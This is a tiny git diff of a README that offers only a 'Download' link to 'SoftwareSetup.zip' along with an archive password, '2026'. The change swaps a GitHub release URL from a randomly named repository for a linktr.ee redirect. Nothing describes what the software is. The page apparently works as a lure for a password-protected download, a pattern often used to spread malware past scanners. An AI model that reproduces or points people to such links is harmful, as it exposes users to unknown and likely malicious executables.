@@ -1,6 +1,6 @@
 ![logo](pic.jpg)
 # ✅ Link:
-[Download](https://github.com/bravestokermattock/qoetztvv/releases/download/dsfasf/SoftwareSetup.zip)
+[Download](https://linktr.ee/susanbrownu640)
 
 **PASSWORD: 2026**
 
